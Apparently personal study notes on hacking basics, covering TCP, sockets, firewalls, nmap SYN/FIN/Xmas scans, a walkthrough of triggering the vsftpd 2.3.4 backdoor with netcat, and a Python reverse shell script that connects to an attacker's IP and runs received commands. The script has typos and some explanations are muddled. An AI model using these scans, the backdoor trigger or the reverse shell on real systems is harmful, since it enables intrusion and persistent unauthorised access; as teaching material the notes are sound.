When trying to break into a company you can use a REVERSE SHELL that allows you to remotely execute commands.
Even after the vulnerability that let you in is fixed it allows the hacker to still have access.

SOCKET Programming

SOCKET is an API that allows programs to communicate over the network [TCP and UDP]

TCP is used when all data needs to be sent reliably

UDP is used in audio or video calls when real-time delivery is important.

TCP Handshakes
---
-Each packet is assigned a sequence number representing its place in the transmission.
-If a packet within the sequence is missing TCP will know it is missing and try to retransmit.
-TCP packets have a max size of 64KB, so a file any larger is divided into several TCP Packets.
-Sequence numbers are consecutive to allow the recipient to know the proper order, 
however each machine starts the sequence with a random number to keep hackers from predicting the sequence.

TCP Three-Way Handshake
SYN(x) -> SYN(y) ACK(x+1) -> ACK(y+1)
1. Sends the server a SYN packet [TCP packet with the SYN value set to true] (Contains the clients starting sequence number)
2. One the the server receives the SYN packet it records the clients sequence number and responds by sending a SYN-ACK request. (This acknowledges what was given and sends the servers sequence number)
3. However, the connection is not established until the server receives a follow up ACK from the client to confirm.
4. Once the systm has finished exchanging packets. They close the connection through the FIN and ACK packets

TCP Allows for Full-Duplex communication which means the sender and reciever can transmit data at the same time.

Half duplex can only have one party transmitting at a time.

In a Full Duplex connection if one side sends a FIN packet the connection does not end until the other machine sends a FIN packet back

TCP Reverse Shell

SSH (Secure Shell) - Use sockets to connect to remote servers.
NAT (Network Address Translation) - Router uses the IP given by the modem to connect all the devices to the router.

Firewalls - These along with the NAT (routers) prevent machines outside the network form initiating connections to servers inside the network.
However, many firewalls allow the reverse: machines inside can still connect to machines outside the network.

To circumvent the firewall and NAT, hackers can install a program called a reverse chell on the compromised machine that will initiate a connection from within the network to the attackers computer outside.
They will be able to run commands as if they are inside as the attacker.
Many shells will mask their traffic bu using port 53 and encapsulating data in DNS packets.

REVERSE SHELL - contains 2 parts: A component that connects to the attackers computer AND shell component that allows the attacker to run commands on the victim computer.

https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?&page=1  [Transport Protocol Port Number Registry]

Client-Server Model - Clients connect to and communicate with a dedicated server. EXAMPLE = web browser is a TCP Client that communicates with Google's TCP web server on 172.217.12.238 port 80.

Peer-to-Peer - Exchange information directly with one another. 

Scanning for Open Ports

If an attacker is able to find an open port they can send malicious packets that can possibly compromise the machine.

SCANNING FOR OPEN PORTS

nmap - [Allows hackers to scan systems to discover open ports]

CMD    nmap -sV 192.168.1.100          (sV tag enables version detection)
This command will return the open ports, the applications running on those ports, and the version of those application.

When running this command it doesn't establish a full connection becauase it sends and SYN, listens for a SYN-ACK, and then does not send the final ACK. (SYN Scan)

Verifying with trying to connect to each port would be slow and trigger alarms with a full communication.

CMD      nmap -sS 192.168.1.100      (Explicitly run a SYN Scan)

Hackers can also use TCP-FIN packets to bypass firewall protections.   EXAMPLE: Port 22 may only allow outgoing packets and it would block a SYN packet request. FIN is able to monitor both incoming and outgoing.

CMD      nmap -sF 192.168.1.100      (FIN scan)

XMas scans which use an odd packet configuration to bypass detection and learn about the system. This scan sets the FIN, PSH, and URG flags in the TCP Packet.
PSH and URG flags are rarely used, and systems often contain incomplete implementation of these flags.
How a system responds to these flags can help an attacker.

CMD      nmap -sX 192.168.1.100      (XMas scam)

EXAMPLE:
[sudo netdiscover] to find the ip you want to attack
[nmap -sV 192.168.1.100] = The ftp server that is being used is vsftp 2.3.4 (this version has a backdoor vulnerability)
[nc 192.168.1.100 21] = Open up a Netcat that you will need to put a user and pass
user Hacker:)
pass invalid
This will open port 6200, but the terminal will appear to hang.
Open a new terminal and try to connect to port 6200

reverseShell.py

import sys
from subprocess import Popen, PIPE
from socket import *
serverName = sys.argv[1]                                        	(Attackers IP from the first command line)
serverPort = 8000
#Create IPv4(AF_INET, TCPSocket(Sock_Stream)
clientSocket = socket(AF_INET, SOCK_STREAM)                     	(Creating a client socket IPv4 and Socket)
clientSocket.connect((serverName, serverPort))                  	(Not that the socket is created we can connect by supplying a TUPLE containing the sockets IP and port number)
clientSocket.send('bot reporting for duty'.encode())			(This it to notify the attacker the machine is ready to accept attacks)
command = clientSocket.recv(4064).decode()				(It needs to be decoded if we want it to view as a string)
while command != "exit":
	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)	(The client will continue accepting and executing commands until the hacker sends the exit command) (Popen creates a copy or a fork [subprocess])
	result, err = proc.communicate()				(
	clientSpclet.send(result)
	command = (clientSocket.recv(4064)).decode()

clientSocket.close()

